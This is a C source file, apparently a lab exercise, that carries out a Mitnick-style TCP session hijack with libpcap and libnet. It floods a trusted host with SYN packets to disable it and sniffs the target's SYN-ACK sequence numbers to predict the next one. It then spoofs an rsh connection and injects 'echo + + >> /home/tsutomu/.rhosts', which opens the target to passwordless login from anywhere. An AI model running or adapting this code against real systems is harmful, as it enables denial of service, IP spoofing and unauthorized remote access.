
#include <stdio.h>
#include <pcap.h>
#include <libnet.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <inttypes.h>
#include <time.h>

#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define ETHERNET_HEADER_SIZE 14 //its static

struct iphdr
{
    u_char ip_vhl;      
    u_char ip_tos;      
    u_short ip_len;     
    u_short ip_id;      
    u_short ip_off;     
    u_char ip_ttl;      
    u_char ip_p;        
    u_short ip_sum;        
    struct in_addr ip_src, ip_dst; 
};

#define IP_HEADER_LEN(iplen)    (((iplen)->ip_vhl) & 0x0f);

struct tcphdr
{
    u_short th_sport;
    u_short th_dport;
    u_int th_seq;    
    u_int th_ack;       
    u_char th_offx2; 
    #define TH_OFF(th)    (((th)->th_offx2 & 0xf0) >> 4)
    u_char th_flags;
    #define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    u_short th_win;      
    u_short th_sum;     
    u_short th_urp;      
};
/*libnet_t * libnet_init (int injection_type, const char *device, char
           *err_buf);
uint32_t libnet_name2addr4 (libnet_t *l, char *host_name, uint8_t
           use_name);
libnet_ptag_t libnet_build_tcp (uint16_t sp, uint16_t dp, uint32_t seq,
           uint32_t ack, uint8_t control, uint16_t win, uint16_t sum, uint16_t
           urg, uint16_t len, const uint8_t *payload, uint32_t payload_s,
           libnet_t *l, libnet_ptag_t ptag);*/
//pcap_t *pcap_open_live(const char *device, int snaplen, int promisc, int to_ms, char *errbuf);
//u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h);
//int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user);
//void callback_function(u_char *arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
//int pcap_compile(pcap_t *p, struct bpf_program *fp, const char *str, int optimize, bpf_u_int32 mask);
//int pcap_setfilter(pcap_t *p, struct bpf_program *fp);
//libnet_ptag_t libnet_build_ipv4 (uint16_t ip_len, uint8_t tos, uint16_t id, uint16_t frag, uint8_t ttl, uint8_t prot, uint16_t sum,uint32_t src, uint32_t dst, const uint8_t *payload, uint32_t payload_s, libnet_t *l, libnet_ptag_t ptag)

//pcap_t *pcap_open_live(const char *device, int snaplen,int promisc, int to_ms, char *errbuf);
//int pcap_compile(pcap_t *p, struct bpf_program *fp,const char *str, int optimize, bpf_u_int32 netmask);
//int pcap_lookupnet(const char *device, bpf_u_int32 *netp,bpf_u_int32 *maskp, char *errbuf);
//int pcap_setfilter(pcap_t *p, struct bpf_program *fp);
//pcap_loop(pcap_t *p, int cnt,pcap_handler callback, u_char *user);

char errorbuffer[PCAP_ERRBUF_SIZE];
uint source, destination;
libnet_t *libentinit;
libnet_ptag_t build_ip,build_tcp;
char device[] = "eth0";
pcap_t *x;
struct bpf_program bpf;
bpf_u_int32 netp,maskp;
char filter[] = "src host 172.16.8.4 and not arp and port 514 and tcp[13]==18";
int found = 0;
//void my_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char*
//    packet)
//{
  //  static int count = 1;
    //fprintf(stdout, "%3d, ", count);
   // fflush(stdout);
    //count++;
//}
int count = 0;
u_int prev_seq = 0;
int repeat = 0;
u_int prev_difference = 0;
u_int diff_diff = 0;
u_int difference = 0;


void run_exploit()
{
printf("\n................\nRUNNING EXPLOIT \n");
printf("\n Sending the spoof packet\n");
source = libnet_name2addr4(libentinit,"172.16.8.3",LIBNET_DONT_RESOLVE);
destination = libnet_name2addr4(libentinit,"172.16.8.4",LIBNET_DONT_RESOLVE);
u_int seq = libnet_get_prand(LIBNET_PRu32);

build_tcp = libnet_build_tcp(998,514,seq,libnet_get_prand(LIBNET_PRu32),TH_SYN,libnet_get_prand(LIBNET_PRu16),0, 0,LIBNET_TCP_H,NULL,0,libentinit,build_tcp);
build_ip = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H,0,libnet_get_prand(LIBNET_PRu16),0,libnet_get_prand(LIBNET_PR8),IPPROTO_TCP,0,source,destination,NULL,0,libentinit,build_ip);
libnet_write(libentinit);

build_tcp = libnet_build_tcp(998,514,seq+1,prev_seq+difference+diff_diff+1,TH_ACK,libnet_get_prand(LIBNET_PRu16),0, 0,LIBNET_TCP_H,NULL,0,libentinit,build_tcp);
build_ip = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H,0,libnet_get_prand(LIBNET_PRu16),0,libnet_get_prand(LIBNET_PR8),IPPROTO_TCP,0,source,destination,NULL,0,libentinit,build_ip);
usleep(25000);
libnet_write(libentinit);


printf("ACK spoof %u\n",prev_seq+difference+diff_diff+1 );
char  command[] = "0\0tsutomu\0tsutomu\0echo + + >> /home/tsutomu/.rhosts\0" ;
int command_len =sizeof(command);
build_tcp = libnet_build_tcp(998,514,seq+1,prev_seq+difference+diff_diff+1,TH_PUSH|TH_ACK,libnet_get_prand(LIBNET_PRu16),0, 0,LIBNET_TCP_H+command_len,(uint8_t*)command,command_len,libentinit,build_tcp);
build_ip = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H,0,libnet_get_prand(LIBNET_PRu16),0,libnet_get_prand(LIBNET_PR8),IPPROTO_TCP,0,source,destination,NULL,0,libentinit,build_ip);
usleep(25000);
printf("Payload written ACK %u",libnet_write(libentinit));


build_tcp = libnet_build_tcp(998,514,seq+command_len+1,prev_seq+difference+diff_diff+1+1,TH_ACK,libnet_get_prand(LIBNET_PRu16),0, 0,LIBNET_TCP_H,NULL,0,libentinit,build_tcp);
build_ip = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H,0,libnet_get_prand(LIBNET_PRu16),0,libnet_get_prand(LIBNET_PR8),IPPROTO_TCP,0,source,destination,NULL,0,libentinit,build_ip);
libnet_write(libentinit);

exit(1);
}

void parsepackets(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer)
{
    const struct iphdr *ip_hdr = (struct iphdr *) (buffer + ETHERNET_HEADER_SIZE);
    int sizeip = (((ip_hdr)->ip_vhl) & 0x0f) * 4;
    const struct tcphdr *tcp_hdr = (struct tcphdr *) (buffer + ETHERNET_HEADER_SIZE + sizeip);
    int size_tcp = TH_OFF(tcp_hdr) * 4;
    uint32_t seq = ntohl(tcp_hdr->th_seq);
    if((prev_seq + difference + diff_diff) == seq)
	{
	found =1;
	printf("prev=%u:seq=%u:difference=%u:prev_diff=%u\n",prev_seq,seq,difference,diff_diff);
        printf("found iteration value in sequence difference, next seq =%u\n\n",prev_seq + difference + diff_diff);
	difference  = seq - prev_seq;
	prev_seq = seq;
	 printf("found iteration value in sequence difference, next seq =%u\n\n",prev_seq + difference + diff_diff);
	run_exploit();
	exit(1);
	
	}
    difference = seq - prev_seq;
    diff_diff = difference - prev_difference;
    printf("prev=%u:seq=%u:difference=%u:prev_diff=%u\n",prev_seq,seq,difference,diff_diff);
    prev_seq = seq;
    prev_difference = difference;
    fflush(stdout);
}

void pcapture()
{
  if(pcap_lookupnet(device,&netp,&maskp,errorbuffer)==-1)
        {
        printf("Device look up failed\n");
        printf("%s", errorbuffer);
        exit(1);
        }
        x = pcap_open_live(device,2000,1,1000,errorbuffer);
  if (!x)
        {
        printf("Could not open sniffing session.\n");
        printf("%s", errorbuffer);
        exit(1);
        }
  if(pcap_compile(x,&bpf,filter,0,netp)==-1)
        {
        printf("Compiled failed with given filter and device");
        exit(1);
        }
  if(pcap_setfilter(x,&bpf)==-1)
        {
        printf("Couldn't set the filter on complied packets");
        exit(1);
        }
    
}

int main(int argc, char *argv[])
	{
        char disablepayload[] = "disable";

        libentinit = libnet_init(LIBNET_RAW4,"eth0",errorbuffer);
	libnet_seed_prand(libentinit);

        source = libnet_name2addr4(libentinit,"130.37.198.122",LIBNET_DONT_RESOLVE);
        destination = libnet_name2addr4(libentinit,"172.16.8.3",LIBNET_DONT_RESOLVE);

	build_tcp = libnet_build_tcp(libnet_get_prand(LIBNET_PRu16),513,libnet_get_prand(LIBNET_PRu32),libnet_get_prand(LIBNET_PRu32),TH_SYN,libnet_get_prand(LIBNET_PRu16),0, 0,LIBNET_TCP_H + strlen(disablepayload),
                (uint8_t *)disablepayload,strlen(disablepayload),libentinit,0);
	printf("Initializing the attack\n");
        printf("Sending disable payload \n");

        build_ip  = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H  + strlen(disablepayload),0,libnet_get_prand(LIBNET_PRu16),0,libnet_get_prand(LIBNET_PR8),IPPROTO_TCP,0,source,destination,NULL,0,libentinit,0);

	int i=0;
	while(i!=10) {

	build_tcp = libnet_build_tcp(libnet_get_prand(LIBNET_PRu16),513,libnet_get_prand(LIBNET_PRu32),libnet_get_prand(LIBNET_PRu32),TH_SYN,libnet_get_prand(LIBNET_PRu16),0, 0,LIBNET_TCP_H + strlen(disablepayload),
		(uint8_t *)disablepayload,strlen(disablepayload),libentinit,build_tcp);
        libnet_write(libentinit);
	i++;
	}
	printf("DOSing and disabled the server ....\n");
	source = libnet_name2addr4(libentinit,"172.16.8.2",LIBNET_DONT_RESOLVE);
	destination = libnet_name2addr4(libentinit,"172.16.8.4",LIBNET_DONT_RESOLVE);
	pcapture();
        i = 0;
	while(i!=4){
	build_tcp = libnet_build_tcp(998,514,libnet_get_prand(LIBNET_PRu32),libnet_get_prand(LIBNET_PRu32),TH_SYN,libnet_get_prand(LIBNET_PRu16),0, 0,LIBNET_TCP_H,NULL,0,libentinit,build_tcp);
	build_ip = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H,0,libnet_get_prand(LIBNET_PRu16),0,libnet_get_prand(LIBNET_PR8),IPPROTO_TCP,0,source,destination,NULL,0,libentinit,build_ip);
	libnet_write(libentinit);
	i++;
	usleep(25000);
	}
	pcap_loop(x,-1,parsepackets,NULL);
	pcap_freecode(&bpf);
    	pcap_close(x);
	return(0);
	}
